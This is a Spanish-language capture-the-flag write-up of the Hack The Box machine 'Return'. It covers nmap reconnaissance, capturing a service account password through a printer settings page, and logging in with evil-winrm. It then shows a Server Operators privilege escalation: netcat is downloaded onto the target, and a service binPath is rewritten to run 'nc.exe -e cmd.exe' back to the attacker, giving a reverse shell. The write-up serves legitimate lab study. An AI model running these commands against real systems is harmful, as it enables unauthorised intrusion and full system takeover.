---
title: Writeup return - Hack The Box - Resolución y Análisis
published: true
tags:
  - hackthebox
  - writeup
  - return
  - ciberseguridad
  - pentesting
description: Writeup y resolución de la máquina return en Hack The Box.
keywords:
  - writeup return
  - hack the box return
  - resolución máquina return
  - return hack the box
  - htb return
---
------
### 🔗 Accesos rápidos

- 📄 **Writeup online**: [Link](https://publish.obsidian.md/bunzopy/HTB/Facil/Windows/Return)
- 📺 **Resolución en vivo (completa)**: [Link](https://www.youtube.com/watch?v=pcCfAdKNyao)
- 🧠 **Explicación resumida**: 

---

#easy #windows #nmap #ping #ad #activedirectory #/etc/hosts #whatweb #wappalyzer #serveroperatorsgroup #mkdir #cd #whoami #netuser #evil-winrm #rwrapncnlvp443 #python3httpserver 

-----
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.129.120.149
nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn 10.129.120.149 -oG allPortsTCP
extractPorts allPortsTCP
nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49674,49675,49676,49680,49694,52847 10.129.120.149 -oN targetTCP
nmap -sU --top-ports 200 -n -Pn 10.129.120.149 -oG allPortsUDP
extractPorts allPortsUDP
nmap -sU -sCV -p53,88,123,137,138,389,464,500,1036,1419,4500,5353,5355,49187,65024 10.129.120.149 -oN targetUDP
```
![[Return3.png]]
![[Return4.png]]
![[Return5.png]]
![[Return6.png]]
![[Return1.png]]
![[Return2.png]]

![[Return7.png]]
![[Return9.png]]

*TTL:* Maquina Windows
*Puertos Importantes TCP:*
	`445` [[smb]]
	`5985` [[evil-winrm]]
*Puertos Importantes UDP*
	Mucho ruido
*Datos Importantes:*
	Nos aparece el dominio return.local0

------
# Agregamos dominio al /etc/hosts

Con [[nvim]] abrimos el archivo /etc/hosts siendo sudo y usando el comando `nvim /etc/hosts`

```
10.129.120.149 return.local0
```

![[Return8.png]]

----
# [[Whatweb-wappalyzer]]

```shell
whatweb http://10.129.120.149/
```

![[Return11.png]]

![[Return10.png]]
PHP 7.4.13 y IIS10.0

-------
# Intrusion a la maquina

![[Return12.png]]
Y en settings nos da esto

![[Return13.png]]
Ahora mientras estamos en escucha con [[nc -nlvp 443]] vamos a poner nuestra ip en la parte de *Server Adress*

![[Return14.png]]
![[Return15.png]]
Y obtenemos estos datos: 1edFg43012!!

## Conexion a la maquina con [[evil-winrm]]

```
evil-winrm -i 10.129.120.149 -u 'svc-printer' -p '1edFg43012!!' -P 5985
```

![[Return19.png]]

Ya estamos adentro y podemos catear la flag de user.txt
![[Return20.png]]

-------
# Escalada de privilegios con [[Server Operators group]]

Usamos [[whoami]] con el comando `whoami /all` para ver todos los permisos que tiene nuestro usuario y vemos el 


![[Return31.png]]
Vamos a guiarnos con este [articulo](https://www-hackingarticles-in.translate.goog/windows-privilege-escalation-server-operator-group/?_x_tr_sl=en&_x_tr_tl=es&_x_tr_hl=es) para hacer la escalada

Tambien con [[net user]] usando el comando `net user svc-printer` podemos mostrar los detalles del acuenta
![[Return24.png]]

Ahora con el comando [[services]] vamos a enumerar todos los ervicios de windows instalados en la amquina
![[Return25.png]]

Ahora vamos a pasarnos el [[Netcat]] levantando un servidor desde nuestra maquina de atacante con [[python3 -m http.server]] usando el comando `python3 -m http.server 80`

![[Return27.png]]
Ahora con [[cd]] vamos a usar `cd C:\` y luego vamos a crear con [[mkdir]] usando el comando `mkdir temp`  y luego encontramos con `cd temp`.  Esto lo hacemos para estar en una carpeta que no vayamos a tener ningun problema con los permisos
Con [[wget]] vamos a descargarlo desde la maquina victima con el coando `wget http://10.10.16.69/nc64.exe -outfile nc64.exe`


![[Return26.png]]
Ahora vamos a ejecutar las instrucciones que nos da el articulo para enviarnos una [[Reverse shell]] mientras estamos en escucha con [[rlwrap -cAr nc -lvnp 443]]
La idea es que configuremos el servicio de vm para que ejecute la accion de la [[Reverse shell]] y a posteriori reiniciamos el servicio asi se ejecuta nuesstra nueva instruccion

```
sc.exe config VMTools binPath= "C:\temp\nc.exe -e cmd.exe 192.168.1.205 1234"           /Cargamos la configuracion
sc.exe stop VMTools        /Paramos el servicio
sc.exe star VMTools        /Volvemos a iniciar el servicio
```
![[Return28.png]]

![[Return29.png]]
Y listo ya somos root y podemos catear las flags

![[Return32.png]]
![[Return30.png]]

------
# Notas


Intente escalar privilegios con [[SeBackupPrivilege]], pero cuando intente decifrar los datos del archivo sam tiraba este error
![[Return23.png]]


------




